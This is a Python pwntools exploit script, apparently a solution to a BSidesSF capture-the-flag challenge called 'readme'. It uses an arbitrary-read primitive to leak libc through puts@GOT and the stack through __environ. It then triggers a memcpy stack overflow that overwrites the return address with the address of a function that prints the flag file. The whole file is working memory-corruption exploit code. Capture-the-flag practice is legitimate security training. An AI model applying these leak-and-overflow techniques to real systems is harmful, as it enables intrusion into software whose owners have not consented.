#!/usr/bin/env python3
"""readme — Arbitrary read + memcpy stack overflow → secret_function"""
from pwn import *
import sys

context.arch = 'amd64'

HOST = sys.argv[1] if len(sys.argv) > 1 else 'readme-02de52b5.challenges.bsidessf.net'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4446

SECRET_FUNC = 0x40148c   # opens flag.txt, prints it, exits
PUTS_GOT    = 0x404008

# Adjust if libc differs — offset for puts in the challenge libc
PUTS_OFFSET   = 0x80e50   # typical for glibc 2.35-2.39, adjust as needed
ENVIRON_OFFSET = None       # resolved dynamically

io = remote(HOST, PORT)
io.recvuntil(b'GO\n')

# --- Step 1: leak libc base via puts@GOT ---
io.sendline(b'r')
io.sendline(b'404008')
io.sendline(b'8')
puts_addr = u64(io.recvn(8))
log.info(f"puts@GOT = {hex(puts_addr)}")

# Try to use the provided libc if available
try:
    libc = ELF('../shared/libc.so.6', checksec=False)
    libc_base = puts_addr - libc.symbols['puts']
    environ_addr = libc_base + libc.symbols['__environ']
except:
    # Fallback: estimate offsets
    libc_base = puts_addr - PUTS_OFFSET
    environ_addr = libc_base + 0x221200  # __environ offset, adjust for target libc

log.info(f"libc base = {hex(libc_base)}")

# --- Step 2: leak stack via __environ ---
io.sendline(b'r')
io.sendline(hex(environ_addr)[2:].encode())
io.sendline(b'8')
stack_env = u64(io.recvn(8))
rbp = stack_env - 0x128
log.info(f"__environ = {hex(stack_env)}")
log.info(f"main rbp  = {hex(rbp)}")

# --- Step 3: overflow via 'h' command ---
# memcpy(rbp-0x120, ptr, len) — need ptr such that ptr+0x128 = length_input[8]
# length_input is at rbp-0x180, so we want ptr+0x128 = rbp-0x180+8 = rbp-0x178
# ptr = rbp - 0x178 - 0x128 = rbp - 0x2A0
src_ptr = rbp - 0x2A0

io.sendline(b'h')
io.sendline(hex(src_ptr)[2:].encode())
# Length input: "130\0" (strtol parses 0x130=304 bytes, enough to reach ret)
# then at byte 8: secret_function address → lands at s1[0x128] = return address
io.sendline(b"130\x00\x00\x00\x00\x00" + p64(SECRET_FUNC))

# Consume hex dump output
io.recvn(0x130 * 2, timeout=10)

# Close stdin → main returns → secret_function prints flag
io.shutdown('send')
data = io.recvall(timeout=5)
print(data.decode(errors='replace'))
